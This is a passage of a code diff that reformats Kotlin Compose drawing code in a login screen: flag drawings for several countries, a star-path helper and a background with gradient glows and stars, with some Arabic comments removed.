+                    drawPath(starPath(w*0.6f, h/2f, h*0.13f, 180), Color.White)
                 }
                 "kr" -> {
                     drawRect(Color.White)
                     val d = h * 0.56f
-                    val tl = Offset(w / 2f - d / 2f, h / 2f - d / 2f)
+                    val tl = Offset(w/2f - d/2f, h/2f - d/2f)
                     drawArc(Color(0xFFCD2E3A), 180f, 180f, true, tl, Size(d, d))
                     drawArc(Color(0xFF0047A0), 0f, 180f, true, tl, Size(d, d))
                 }
                 "vn" -> {
                     drawRect(Color(0xFFDA251D))
-                    drawPath(starPath(w / 2f, h / 2f, h * 0.28f),
-                        Color(0xFFFFFF00))
+                    drawPath(starPath(w/2f, h/2f, h*0.28f), Color(0xFFFFFF00))
                 }
                 "fr" -> {
-                    drawRect(Color(0xFF0055A4), size = Size(w / 3f, h))
-                    drawRect(Color.White,
-                        topLeft = Offset(w / 3f, 0f),
-                        size = Size(w / 3f, h))
+                    drawRect(Color(0xFF0055A4), size = Size(w/3f, h))
+                    drawRect(Color.White, topLeft = Offset(w/3f, 0f),
+                        size = Size(w/3f, h))
                     drawRect(Color(0xFFEF4135),
-                        topLeft = Offset(2f * w / 3f, 0f),
-                        size = Size(w / 3f, h))
+                        topLeft = Offset(2f*w/3f, 0f), size = Size(w/3f, h))
                 }
                 "pt" -> {
-                    drawRect(Color(0xFF046A38), size = Size(w * 0.4f, h))
+                    drawRect(Color(0xFF046A38), size = Size(w*0.4f, h))
                     drawRect(Color(0xFFDA291C),
-                        topLeft = Offset(w * 0.4f, 0f),
-                        size = Size(w * 0.6f, h))
-                    drawCircle(Color(0xFFFFE900),
-                        radius = h * 0.16f,
-                        center = Offset(w * 0.4f, h / 2f))
+                        topLeft = Offset(w*0.4f, 0f), size = Size(w*0.6f, h))
+                    drawCircle(Color(0xFFFFE900), radius = h*0.16f,
+                        center = Offset(w*0.4f, h/2f))
                 }
                 "pk" -> {
                     drawRect(Color(0xFF01411C))
-                    drawRect(Color.White, size = Size(w * 0.25f, h))
-                    drawCircle(Color.White, radius = h * 0.28f,
-                        center = Offset(w * 0.62f, h * 0.45f))
-                    drawCircle(Color(0xFF01411C), radius = h * 0.24f,
-                        center = Offset(w * 0.68f, h * 0.4f))
+                    drawRect(Color.White, size = Size(w*0.25f, h))
+                    drawCircle(Color.White, radius = h*0.28f,
+                        center = Offset(w*0.62f, h*0.45f))
+                    drawCircle(Color(0xFF01411C), radius = h*0.24f,
+                        center = Offset(w*0.68f, h*0.4f))
                 }
                 "ir" -> {
-                    drawRect(Color(0xFF239F40), size = Size(w, h / 3f))
-                    drawRect(Color.White, topLeft = Offset(0f, h / 3f),
-                        size = Size(w, h / 3f))
+                    drawRect(Color(0xFF239F40), size = Size(w, h/3f))
+                    drawRect(Color.White, topLeft = Offset(0f, h/3f),
+                        size = Size(w, h/3f))
                     drawRect(Color(0xFFDA0000),
-                        topLeft = Offset(0f, 2f * h / 3f),
-                        size = Size(w, h / 3f))
-                    drawCircle(Color(0xFFDA0000), radius = h * 0.11f,
-                        center = Offset(w / 2f, h / 2f))
+                        topLeft = Offset(0f, 2f*h/3f), size = Size(w, h/3f))
+                    drawCircle(Color(0xFFDA0000), radius = h*0.11f,
+                        center = Offset(w/2f, h/2f))
                 }
                 "th" -> {
                     val s = h / 6f
                     drawRect(Color(0xFFA51931), size = Size(w, s))
-                    drawRect(Color(0xFFF4F5F8),
-                        topLeft = Offset(0f, s),
+                    drawRect(Color(0xFFF4F5F8), topLeft = Offset(0f, s),
                         size = Size(w, s))
-                    drawRect(Color(0xFF2D2A4A),
-                        topLeft = Offset(0f, 2f * s),
-                        size = Size(w, 2f * s))
-                    drawRect(Color(0xFFF4F5F8),
-                        topLeft = Offset(0f, 4f * s),
+                    drawRect(Color(0xFF2D2A4A), topLeft = Offset(0f, 2f*s),
+                        size = Size(w, 2f*s))
+                    drawRect(Color(0xFFF4F5F8), topLeft = Offset(0f, 4f*s),
                         size = Size(w, s))
-                    drawRect(Color(0xFFA51931),
-                        topLeft = Offset(0f, 5f * s),
+                    drawRect(Color(0xFFA51931), topLeft = Offset(0f, 5f*s),
                         size = Size(w, s))
                 }
                 else -> drawRect(Color(0xFF555555))
@@ -1216,12 +1443,8 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
-    private fun starPath(
-        cx: Float,
-        cy: Float,
-        outerR: Float,
-        startDeg: Int = -90
-    ): Path {
+    private fun starPath(cx: Float, cy: Float, outerR: Float,
+                         startDeg: Int = -90): Path {
         val innerR = outerR * 0.382f
         val path = Path()
         for (i in 0 until 10) {
@@ -1236,7 +1459,7 @@ class LoginActivity : ComponentActivity() {
     }
 
     // =================================================
-    // الخلفية — تحمّل background.png من assets
+    // الخلفية
     // =================================================
 
     @Composable
@@ -1248,68 +1471,44 @@ class LoginActivity : ComponentActivity() {
         }
 
         Canvas(modifier = Modifier.fillMaxSize()) {
-            // 1. الصورة من assets (إن وُجدت)
             if (bg != null) {
-                val scale = maxOf(
-                    size.width / bg.width,
-                    size.height / bg.height
-                )
+                val scale = maxOf(size.width / bg.width, size.height / bg.height)
                 val dw = bg.width * scale
                 val dh = bg.height * scale
                 drawImage(
                     image = bg.asImageBitmap(),
                     dstOffset = IntOffset(
-                        ((size.width - dw) / 2).roundToInt(),
-                        ((size.height - dh) / 2).roundToInt()
+                        ((size.width - dw)/2).roundToInt(),
+                        ((size.height - dh)/2).roundToInt()
                     ),
                     dstSize = IntSize(dw.roundToInt(), dh.roundToInt())
                 )
-                // تعتيم فوق الصورة
                 drawRect(Brush.verticalGradient(
-                    listOf(Color(0x99060021), Color(0xCC040018))
-                ))
+                    listOf(Color(0x99060021), Color(0xCC040018))))
             } else {
-                // بديل: تدرج لوني
                 drawRect(Brush.verticalGradient(
-                    listOf(Neon.DeepTop, Neon.DeepMid, Neon.DeepBottom)
-                ))
+                    listOf(Neon.DeepTop, Neon.DeepMid, Neon.DeepBottom)))
             }
 
-            // 2. هالة بنفسجية
             drawCircle(
                 brush = Brush.radialGradient(
-                    listOf(
-                        Neon.Magenta.copy(alpha = 0.28f),
-                        Color.Transparent
-                    ),
-                    center = Offset(size.width * 0.85f, size.height * 0.07f),
-                    radius = size.width * 0.55f
-                ),
-                radius = size.width * 0.55f,
-                center = Offset(size.width * 0.85f, size.height * 0.07f)
-            )
+                    listOf(Neon.Magenta.copy(alpha=0.28f), Color.Transparent),
+                    center = Offset(size.width*0.85f, size.height*0.07f),
+                    radius = size.width*0.55f),
+                radius = size.width*0.55f,
+                center = Offset(size.width*0.85f, size.height*0.07f))
 
-            // 3. هالة سماوية
             drawCircle(
                 brush = Brush.radialGradient(
-                    listOf(
-                        Neon.Cyan.copy(alpha = 0.22f),
-                        Color.Transparent
-                    ),
-                    center = Offset(size.width * 0.06f, size.height * 0.30f),
-                    radius = size.width * 0.60f
-                ),
-                radius = size.width * 0.60f,
-                center = Offset(size.width * 0.06f, size.height * 0.30f)
-            )
+                    listOf(Neon.Cyan.copy(alpha=0.22f), Color.Transparent),
+                    center = Offset(size.width*0.06f, size.height*0.30f),
+                    radius = size.width*0.60f),
+                radius = size.width*0.60f,
+                center = Offset(size.width*0.06f, size.height*0.30f))
 
-            // 4. نجوم
             stars.forEach {
-                drawCircle(
-                    Neon.Cyan.copy(alpha = 0.45f),
-                    radius = 1.4.dp.toPx(),
-                    center = Offset(it.x * size.width, it.y * size.height)
-                )
+                drawCircle(Neon.Cyan.copy(alpha=0.45f), radius = 1.4.dp.toPx(),
+                    center = Offset(it.x*size.width, it.y*size.height))
             }
         }
     }
